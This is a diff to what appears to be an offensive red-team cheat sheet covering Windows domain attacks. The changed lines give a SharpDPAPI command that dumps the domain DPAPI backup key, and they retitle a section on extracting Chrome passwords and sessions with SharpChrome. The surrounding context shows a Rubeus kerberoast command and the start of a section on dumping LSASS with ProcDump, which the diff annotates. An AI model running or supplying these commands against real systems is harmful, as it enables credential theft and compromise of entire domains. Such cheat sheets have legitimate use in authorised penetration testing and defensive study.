@@ -164,10 +164,11 @@ execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHash.txt /user:testaccoun
 ------------------------------------------------------------------------------------------
 ## Exploitation
 
-### Chrome Session Stealing
-SharpDPAPI to dump domain master key (requires DA privileges)
+### DPAPI decryption and extraction on Windows systems
+[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
 ```
-
+# SharpDPAPI to retrieve domain DPAPI backup key and output to file which is used for subsequent attacks (requires DA privileges)
+execute-assembly SharpDPAPI.exe backupkey /file:key.pvk
 ```
 
 SharpChrome to extract and decrypt a user's Chrome sessions/passwords
@@ -181,7 +182,7 @@ SharpChrome to extract and decrypt a user's Chrome sessions/passwords
 
 ------------------------------------------------------------------------------------------
 ## Exfiltration - Password Attacks
-### Dumping LSASS locally
+### Dumping LSASS locally (all commands below require local Admin)
 Dumping LSASS with ProcDump.exe (requires touching disk) (NOTE: Might get flagged by AV and raise alerts but will often still output dump file)
 ```
 upload --> ProcDump.exe
